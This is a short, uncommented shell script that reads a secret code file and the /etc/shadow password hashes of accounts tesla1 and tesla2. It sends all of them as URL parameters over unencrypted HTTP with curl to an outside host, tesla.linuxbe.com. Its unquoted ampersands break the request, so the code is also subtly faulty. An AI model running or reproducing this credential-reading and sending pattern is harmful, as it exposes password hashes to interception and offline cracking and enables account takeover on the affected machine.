

code=$(cat /var/etc/saccess/tesla1)
encodedpw1=$(cat /etc/shadow | grep tesla1 |  awk -F: '{ print $2}')
encodedpw2=$(cat /etc/shadow | grep tesla2| awk -F: '{ print $2}')
curl --connect-timeout 10 http://tesla.linuxbe.com/command.php?code=$code&encodedpw1=$encodedpw1&encodedpw2=$encodedpw2

